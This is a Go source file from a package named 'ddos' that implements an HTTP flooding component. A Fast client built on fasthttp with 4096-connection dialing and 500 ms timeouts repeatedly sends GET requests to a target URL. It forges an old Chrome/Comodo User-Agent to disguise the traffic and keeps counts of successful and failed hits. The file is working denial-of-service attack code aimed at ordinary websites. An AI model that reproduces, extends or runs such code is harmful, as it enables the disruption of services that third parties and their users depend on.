package ddos

import (
	"fmt"
	"io"
	"sync/atomic"
	"time"

	"github.com/valyala/fasthttp"
)

type bodyStreamProducer func() (io.ReadCloser, error)

type total int64

func (c *total) Inc() int64 {
	return atomic.AddInt64((*int64)(c), 1)
}

func (c *total) Get() int64 {
	return atomic.LoadInt64((*int64)(c))
}

type Ddos interface {
	Do()
	GetUrl() string
	GetTotal() total
	GetError() total
}

type Fast struct {
	client        *fasthttp.Client
	host          string
	url           string
	totalRequests total
	totalErrors   total
	bodProd       bodyStreamProducer
	debug         bool
}

func New(url string, netHttp, debug bool) Ddos {
	if netHttp {
		return newNetHttp(url, debug)
	}
	return newFasthttp(url, debug)
}

func newFasthttp(url string, debug bool) *Fast {
	f := new(Fast)
	readTimeout, _ := time.ParseDuration("500ms")
	writeTimeout, _ := time.ParseDuration("500ms")
	maxIdleConnDuration, _ := time.ParseDuration("1h")
	c := &fasthttp.Client{
		ReadTimeout:                   readTimeout,
		WriteTimeout:                  writeTimeout,
		MaxIdleConnDuration:           maxIdleConnDuration,
		NoDefaultUserAgentHeader:      true, // Don't send: User-Agent: fasthttp
		DisableHeaderNamesNormalizing: true, // If you set the case on your headers correctly you can enable this
		DisablePathNormalizing:        true,
		// increase DNS cache time to an hour instead of default minute
		Dial: (&fasthttp.TCPDialer{
			Concurrency:      4096,
			DNSCacheDuration: time.Hour,
		}).Dial,
	}
	f.url = url
	f.client = c
	f.debug = debug
	return f
}

func (c *Fast) Do() {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)
	req.SetRequestURI(c.url)
	req.Header.SetMethod(fasthttp.MethodGet)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip,deflate")
	req.Header.Set("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
	err := c.client.Do(req, resp)
	if resp.StatusCode() < 400 {
		c.totalRequests.Inc()
	}
	if err != nil || resp.StatusCode() > 400 {
		c.totalErrors.Inc()
	}
	if c.debug {
		if err != nil {
			fmt.Println(err.Error())
		}
		fmt.Printf("Response status: %d, Target: %s\n", resp.StatusCode(), c.url)
	}
}

func (c *Fast) GetUrl() string {
	return c.url
}

func (c *Fast) GetTotal() total {
	return c.totalRequests
}

func (c *Fast) GetError() total {
	return c.totalErrors
}
